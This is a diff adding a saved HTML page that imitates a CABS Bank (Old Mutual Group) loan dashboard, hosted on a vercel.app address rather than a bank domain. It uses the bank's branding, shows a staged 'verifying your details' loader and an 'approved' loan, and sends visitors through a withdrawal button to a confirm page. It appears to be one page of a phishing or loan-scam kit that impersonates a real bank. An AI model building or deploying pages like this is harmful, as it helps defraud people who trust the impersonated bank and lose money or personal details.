@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://cabsloan50.vercel.app/dash.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CABS Loan Dashboard | A Member of the Old Mutual Group</title>
+<link href="./CABS Loan Dashboard _ A Member of the Old Mutual Group_files/css2" rel="stylesheet">
+
+<style>
+:root{
+  --primary:#273C83;
+  --primary-dark:#1a2a5c;
+  --primary-light:#3a52a0;
+  --secondary:#f4f6f9;
+  --success-bg:#e8f5e9;
+  --success-text:#2e7d32;
+  --text-dark:#1a1a1a;
+  --text-light:#6c757d;
+  --border:#e2e8f0;
+  --white:#ffffff;
+  --accent:#8DC63F;
+  --accent-light:#a3d45a;
+  --accent-dark:#75a832;
+  --teal:#008670;
+  --teal-light:#00a88a;
+  --shadow:0 4px 20px rgba(39,60,131,0.15);
+  --font-body: 'Albert Sans', sans-serif;
+  --font-heading: 'Urbanist', sans-serif;
+}
+
+*{
+  box-sizing:border-box;
+  font-family: var(--font-body);
+}
+
+body{
+  margin:0;
+  background:linear-gradient(135deg,var(--primary) 0%,var(--primary-dark) 100%);
+  min-height:100vh;
+  padding:20px;
+  color:var(--text-dark);
+  line-height: 1.6;
+}
+
+.container{
+  max-width:900px;
+  margin:auto;
+}
+
+/* Pre-loader Styles */
+.preloader{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:linear-gradient(135deg,var(--primary) 0%,var(--primary-dark) 100%);
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+  transition:opacity 0.5s ease-out,visibility 0.5s ease-out;
+}
+
+.preloader.hidden{
+  opacity:0;
+  visibility:hidden;
+  pointer-events:none;
+}
+
+.loader-container{
+  position:relative;
+  width:120px;
+  height:120px;
+  margin-bottom:30px;
+}
+
+.loader-ring{
+  position:absolute;
+  width:100%;
+  height:100%;
+  border:4px solid transparent;
+  border-top:4px solid var(--primary);
+  border-right:4px solid var(--accent);
+  border-radius:50%;
+  animation:rotate 1.5s linear infinite;
+}
+
+.loader-ring-inner{
+  position:absolute;
+  top:15px;
+  left:15px;
+  right:15px;
+  bottom:15px;
+  border:4px solid transparent;
+  border-bottom:4px solid var(--primary);
+  border-left:4px solid var(--accent);
+  border-radius:50%;
+  animation:rotate 1s linear infinite reverse;
+}
+
+.loader-center{
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  font-size:22px;
+  font-weight:800;
+  color:var(--accent);
+  text-shadow:0 2px 4px rgba(0,0,0,0.3);
+  letter-spacing:-1px;
+  font-family: var(--font-heading);
+}
+
+.loader-dots{
+  display:flex;
+  gap:8px;
+  margin-top:20px;
+}
+
+.dot{
+  width:10px;
+  height:10px;
+  background:var(--primary);
+  border-radius:50%;
+  animation:pulse-dot 1.4s ease-in-out infinite;
+}
+
+.dot:nth-child(1){animation-delay:0s;}
+.dot:nth-child(2){animation-delay:0.2s;}
+.dot:nth-child(3){animation-delay:0.4s;}
+
+@keyframes pulse-dot{
+  0%,80%,100%{transform:scale(0);opacity:0.5;}
+  40%{transform:scale(1);opacity:1;background:var(--accent);}
+}
+
+.processing-text{
+  font-size:18px;
+  color:var(--accent);
+  font-weight:700;
+  text-align:center;
+  margin-top:10px;
+  letter-spacing:0.5px;
+  font-family: var(--font-heading);
+}
+
+.processing-subtext{
+  font-size:14px;
+  color:rgba(255,255,255,0.6);
+  margin-top:8px;
+  text-align:center;
+}
+
+.progress-container{
+  width:280px;
+  height:4px;
+  background:rgba(255,255,255,0.15);
+  border-radius:2px;
+  margin-top:25px;
+  overflow:hidden;
+  position:relative;
+}
+
+.progress-bar{
+  height:100%;
+  background:linear-gradient(90deg,var(--accent) 0%,var(--accent-light) 100%);
+  width:0%;
+  border-radius:2px;
+  animation:loadProgress 2.5s ease-out forwards;
+  box-shadow:0 0 10px rgba(141,198,63,0.5);
+}
+
+@keyframes rotate{
+  0%{transform:rotate(0deg);}
+  100%{transform:rotate(360deg);}
+}
+
+@keyframes loadProgress{
+  0%{width:0%;}
+  50%{width:60%;}
+  70%{width:75%;}
+  100%{width:100%;}
+}
+
+/* CABS Header Bar */
+.cabs-header{
+  background:var(--white);
+  padding:16px 24px;
+  border-radius:16px 16px 0 0;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:12px;
+  margin-bottom:0;
+  border-bottom:3px solid var(--accent);
+}
+
+.cabs-logo{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+
+.cabs-logo img{
+  height:36px;
+  width:auto;
+}
+
+.cabs-logo-text{
+  font-size:22px;
+  font-weight:800;
+  color:var(--primary);
+  letter-spacing:-0.5px;
+  font-family: var(--font-heading);
+}
+
+.cabs-logo-text span{
+  font-weight:400;
+  color:var(--teal);
+}
+
+.cabs-tagline{
+  font-size:12px;
+  color:var(--teal);
+  font-weight:600;
+  text-transform:uppercase;
+  letter-spacing:1px;
+  font-family: var(--font-heading);
+}
+
+.card{
+  background:var(--white);
+  border-radius:0 0 16px 16px;
+  box-shadow:var(--shadow);
+  padding:28px;
+  margin-bottom:20px;
+  opacity:0;
+  transform:translateY(20px);
+  animation:fadeInUp 0.6s ease-out forwards;
+  animation-delay:0.1s;
+}
+
+@keyframes fadeInUp{
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
+}
+
+.header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:24px;
+  flex-wrap:wrap;
+  gap:12px;
+}
+
+.header h2{
+  margin:0;
+  color:var(--primary);
+  font-size:1.5rem;
+  font-weight:700;
+  font-family: var(--font-heading);
+}
+
+.status{
+  padding:8px 18px;
+  border-radius:999px;
+  font-size:13px;
+  background:var(--success-bg);
+  color:var(--success-text);
+  font-weight:600;
+  border:1px solid #c8e6c9;
+  animation:pulse-status 2s infinite;
+  font-family: var(--font-heading);
+}
+
+@keyframes pulse-status{
+  0%,100%{opacity:1;}
+  50%{opacity:0.8;}
+}
+
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+  gap:16px;
+  margin-bottom:28px;
+}
+
+.item{
+  background:var(--secondary);
+  padding:20px;
+  border-radius:12px;
+  border:1px solid #e2e8f0;
+  transition:transform 0.2s,box-shadow 0.2s;
+  position:relative;
+  overflow:hidden;
+  opacity:0;
+  animation:fadeInUp 0.5s ease-out forwards;
+}
+
+.item:nth-child(1){animation-delay:0.2s;}
+.item:nth-child(2){animation-delay:0.3s;}
+.item:nth-child(3){animation-delay:0.4s;}
+.item:nth-child(4){animation-delay:0.5s;}
+.item:nth-child(5){animation-delay:0.6s;}
+.item:nth-child(6){animation-delay:0.7s;}
+
+.item::before{
+  content:"";
+  position:absolute;
+  top:0;
+  left:0;
+  width:4px;
+  height:100%;
+  background:var(--teal);
+}
+
+.item:hover{
+  transform:translateY(-2px);
+  box-shadow:0 4px 12px rgba(39,60,131,0.1);
+}
+
+.item span{
+  display:block;
+  font-size:12px;
+  color:var(--primary);
+  margin-bottom:8px;
+  font-weight:600;
+  text-transform:uppercase;
+  letter-spacing:0.5px;
+  font-family: var(--font-heading);
+}
+
+.item strong{
+  font-size:20px;
+  color:var(--text-dark);
+  font-weight:700;
+  font-family: var(--font-heading);
+}
+
+.summary{
+  border-top:2px solid var(--secondary);
+  padding-top:24px;
+  margin-top:10px;
+  opacity:0;
+  animation:fadeInUp 0.5s ease-out forwards;
+  animation-delay:0.8s;
+}
+
+.summary h3{
+  margin-top:0;
+  color:var(--primary);
+  font-size:1.2rem;
+  font-weight:700;
+  font-family: var(--font-heading);
+}
+
+.note{
+  font-size:14px;
+  color:var(--text-light);
+  margin-bottom:16px;
+  line-height:1.5;
+}
+
+.withdraw-section{
+  background:var(--secondary);
+  border-radius:12px;
+  padding:24px;
+  text-align:center;
+  border:1px solid #e2e8f0;
+}
+
+.withdraw-btn{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  padding:16px 32px;
+  border:none;
+  border-radius:50px;
+  background:linear-gradient(135deg,var(--accent) 0%,var(--accent-dark) 100%);
+  color:var(--primary-dark);
+  font-size:16px;
+  font-weight:800;
+  cursor:pointer;
+  width:100%;
+  max-width:400px;
+  transition:all 0.3s ease;
+  box-shadow:0 4px 15px rgba(141,198,63,0.3);
+  text-decoration:none;
+  position:relative;
+  overflow:hidden;
+  font-family: var(--font-heading);
+  min-height: 52px;
+}
+
+.withdraw-btn::after{
+  content:"";
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:3px;
+  background:var(--primary);
+}
+
+.withdraw-btn:hover{
+  background:linear-gradient(135deg,var(--accent-light) 0%,var(--accent) 100%);
+  transform:translateY(-2px);
+  box-shadow:0 6px 20px rgba(141,198,63,0.4);
+}
+
+.withdraw-btn:active{
+  transform:translateY(0);
+}
+
+.withdraw-btn::before{
+  content:"↗";
+  font-size:20px;
+  color:var(--primary);
+}
+
+.security-notice{
+  margin-top:16px;
+  font-size:13px;
+  color:var(--text-light);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:6px;
+}
+
+.security-notice::before{
+  content:"🔒";
+}
+
+.trust-footer{
+  text-align:center;
+  padding:16px;
+  background:rgba(255,255,255,0.05);
+  border-radius:0 0 16px 16px;
+  margin-top:-20px;
+  margin-bottom:20px;
+}
+
+.trust-footer img{
+  height:28px;
+  opacity:0.6;
+}
+
+.trust-footer p{
+  font-size:11px;
+  color:rgba(255,255,255,0.5);
+  margin-top:6px;
+  font-weight:500;
+}
+
+/* Toast */
+.toast {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  background: var(--primary);
+  color: white;
+  padding: 14px 20px;
+  border-radius: 10px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+  font-weight: 600;
+  font-size: 14px;
+  transform: translateX(150%);
+  transition: transform 0.4s ease;
+  z-index: 1000;
+  font-family: var(--font-body);
+}
+
+.toast.show {
+  transform: translateX(0);
+}
+
+/* MOBILE */
+@media(max-width:480px){
+  body{padding:0;}
+
+  .container{padding:0;}
+
+  .cabs-header{
+    border-radius:0;
+    padding:14px 20px;
+    flex-direction:column;
+    align-items:flex-start;
+    gap:4px;
+  }
+
+  .cabs-tagline{
+    font-size:10px;
+  }
+
+  .card{
+    border-radius:0;
+    box-shadow:none;
+    padding:20px;
+  }
+
+  .item strong{font-size:18px;}
+
+  .withdraw-btn{
+    font-size:15px;
+    padding:14px 24px;
+    max-width: 100%;
+  }
+
+  .loader-container{
+    width:100px;
+    height:100px;
+  }
+
+  .processing-text{
+    font-size:16px;
+  }
+
+  .progress-container{
+    width:240px;
+  }
+
+  .trust-footer{
+    border-radius:0;
+    margin-top:0;
+  }
+
+  .header h2 {
+    font-size: 1.3rem;
+  }
+
+  .toast {
+    left: 16px;
+    right: 16px;
+    top: auto;
+    bottom: 20px;
+    transform: translateY(150%);
+  }
+
+  .toast.show {
+    transform: translateY(0);
+  }
+}
+
+@media(max-width:400px){
+  .grid{
+    grid-template-columns:1fr;
+  }
+
+  .item{
+    padding:16px;
+  }
+
+  .cabs-logo-text {
+    font-size: 18px;
+  }
+}
+</style>
+</head>
+<body>
+
+<!-- Pre-loader -->
+<div class="preloader hidden" id="preloader" style="display: none;">
+  <div class="loader-container">
+    <div class="loader-ring"></div>
+    <div class="loader-ring-inner"></div>
+    <div class="loader-center">CABS</div>
+  </div>
+
+  <div class="loader-dots">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+
+  <div class="processing-text">Your loan is being processed</div>
+  <div class="processing-subtext">Please wait while we verify your details</div>
+
+  <div class="progress-container">
+    <div class="progress-bar"></div>
+  </div>
+</div>
+
+<div class="container" style="display: block;" id="mainContent">
+
+<!-- CABS Brand Header -->
+<div class="cabs-header">
+  <div class="cabs-logo">
+    <img src="./CABS Loan Dashboard _ A Member of the Old Mutual Group_files/d15b33ebf2643f03c732ae0338fa2daa69cb7330.png" alt="CABS Logo">
+    <div>
+      <div class="cabs-logo-text">CABS <span>Bank</span></div>
+    </div>
+  </div>
+  <div class="cabs-tagline">We'll Help You Get There</div>
+</div>
+
+<div class="card">
+
+<div class="header">
+<h2>Loan Overview</h2>
+<div class="status">Active Loan</div>
+</div>
+
+<div class="grid">
+
+<div class="item">
+<span>Borrower Name</span>
+<strong id="fullName">duncan 545</strong>
+</div>
+
+<div class="item">
+<span>Loan Amount</span>
+<strong>USD$<strong id="loanAmount">22</strong></strong>
+</div>
+
+<div class="item">
+<span>Loan Period</span>
+<strong id="repayment">3 Months</strong>
+</div>
+
+<div class="item">
+<span>Interest Rate</span>
+<strong>3% per month</strong>
+</div>
+
+<div class="item">
+<span>Loan Limit</span>
+<strong>USD$<strong id="loanLimit">32</strong></strong>
+</div>
+
+<div class="item">
+<span>Total Payable</span>
+<strong>USD$<strong id="totalPayable">23.98</strong></strong>
+</div>
+
+</div>
+
+<div class="summary">
+  <h3>Withdraw Your Loan</h3>
+  <p class="note">Your approved loan amount is ready for withdrawal. Click below to credit your CABS account instantly.</p>
+
+  <div class="withdraw-section">
+    <a href="https://cabsloan50.vercel.app/confirm.html" class="withdraw-btn" onclick="return handleWithdrawal(event)">
+      Withdraw to CABS Account
+    </a>
+
+    <div class="security-notice">
+      Secure transaction via CABS Bank
+    </div>
+
+
+  </div>
+</div>
+
+</div>
+
+<div class="trust-footer">
+  <img src="./CABS Loan Dashboard _ A Member of the Old Mutual Group_files/d15b33ebf2643f03c732ae0338fa2daa69cb7330.png" alt="CABS Old Mutual">
+  <p>A Member of the Old Mutual Group</p>
+</div>
+
+</div>
+
+<div class="toast" id="toast">Processing withdrawal request...</div>
+
+<script>
+  function showToast(msg) {
+    const toast = document.getElementById("toast");
+    toast.textContent = msg;
+    toast.classList.add("show");
+    setTimeout(() => toast.classList.remove("show"), 3000);
+  }
+
+  // Handle preloader and page transition
+  window.addEventListener("load", () => {
+    const preloader = document.getElementById("preloader");
+    const mainContent = document.getElementById("mainContent");
+
+    setTimeout(() => {
+      preloader.classList.add("hidden");
+      mainContent.style.display = "block";
+
+      setTimeout(() => {
+        preloader.style.display = "none";
+      }, 500);
+
+      loadDashboardData();
+    }, 5000);
+  });
+
+  // Load dashboard data
+  function loadDashboardData() {
+    const fullName = localStorage.getItem("fullName") || "N/A";
+    const loanAmountStr = localStorage.getItem("loanAmount") || "0";
+    const repayment = localStorage.getItem("repayment") || "N/A";
+
+    const loanAmount = parseFloat(loanAmountStr) || 0;
+
+    let months = 6;
+    if (repayment.includes("1 Month")) months = 1;
+    else if (repayment.includes("3 Months")) months = 3;
+    else if (repayment.includes("6 Months")) months = 6;
+    else if (repayment.includes("12 Months")) months = 12;
+
+    const loanLimit = loanAmount + 10;                                                                                                                   
+    const interestRate = 0.03;
+
+    const totalPayable = loanAmount * (1 + interestRate * months);
+
+    document.getElementById("fullName").textContent = fullName;
+    document.getElementById("loanAmount").textContent = loanAmount.toLocaleString();
+    document.getElementById("repayment").textContent = repayment;
+    document.getElementById("loanLimit").textContent = loanLimit.toLocaleString();
+    document.getElementById("totalPayable").textContent = totalPayable.toLocaleString();
+  }
+
+  function handleWithdrawal(e) {
+    e.preventDefault();
+    showToast("Processing withdrawal request...");
+    
+    setTimeout(() => {
+      window.location.href = "/confirm.html";
+    }, 1200);
+    
+    return false;
+  }
+</script>
+
+
+</body></html>
